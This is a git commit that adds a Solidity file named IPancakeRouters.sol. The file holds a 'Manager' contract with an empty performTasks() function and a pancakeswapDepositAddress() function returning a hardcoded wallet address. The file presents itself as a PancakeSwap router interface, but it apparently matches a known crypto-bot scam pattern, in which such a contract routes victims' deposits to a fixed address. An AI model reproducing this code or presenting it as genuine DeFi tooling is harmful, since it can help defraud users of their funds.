46691eb4bd4d8e0e151b9debb9ef1e56a1f9ac54
Benjam6 <106699745+Benjam6@users.noreply.github.com>
2022-06-08 22:31:01 +0100

    Create IPancakeRouters.sol

---
+++ IPancakeRouters.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+
+    }
+
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x54daf7fD97f72eAaC992Cd2ED56f1EA8f9779275;
+    }
+}
+
+//pancakeswapfunction
